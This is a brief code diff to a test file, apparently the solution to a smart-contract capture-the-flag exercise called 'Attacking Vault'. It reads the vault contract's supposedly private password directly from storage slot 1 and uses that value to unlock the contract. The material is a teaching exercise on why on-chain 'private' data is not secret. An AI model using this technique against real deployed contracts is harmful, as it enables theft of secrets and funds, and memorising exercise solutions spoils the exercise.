@@ -14,7 +14,11 @@ describe("Attacking Vault", function () {
 
   // Get this to pass!
   it("Succesfully unlock the vault", async () => {
-    await helper(victim);
+    //await helper(victim);
+
+    const pwd = await ethers.provider.getStorageAt(victim.address, 1);
+    
+    await victim.unlock(pwd);
     const locked = await victim.locked();
     expect(locked).to.be.equal(false);
   });
